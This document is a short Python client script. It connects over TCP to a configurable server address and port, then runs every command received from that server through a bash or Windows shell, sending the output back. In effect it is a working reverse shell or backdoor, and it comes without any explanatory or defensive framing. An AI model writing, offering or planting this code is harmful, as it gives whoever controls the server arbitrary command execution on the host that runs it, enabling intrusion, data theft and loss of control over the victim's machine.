import socket
import threading
import platform
import os

def execute_command(command):
    if platform.system().lower() == "windows":
        import subprocess
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    else:
        import subprocess
        result = subprocess.run(command, shell=True, capture_output=True, text=True, executable="/bin/bash")
        return result.stdout + result.stderr

def main():
    host = "127.0.0.1"  # Change this to your server's IP address
    port = 8888  # Use the same port number as the server

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    response = client_socket.recv(1024)
    print(response.decode())

    receive_thread = threading.Thread(target=receive_messages, args=(client_socket,))
    receive_thread.start()

    while True:
        command = input("Enter a command (or 'exit' to quit): ")
        if command.lower() == "exit":
            client_socket.close()
            break

        client_socket.send(command.encode())  # Send the command to the server

def receive_messages(client_socket):
    while True:
        try:
            data = client_socket.recv(4096)
            if not data:
                print("Server closed the connection.")
                break

            command = data.decode()  # Received command from the server
            result = execute_command(command)  # Execute the command
            client_socket.send(result.encode())  # Send the output back to the server

        except:
            print("Error while receiving data from the server.")
            break

if __name__ == "__main__":
    main()

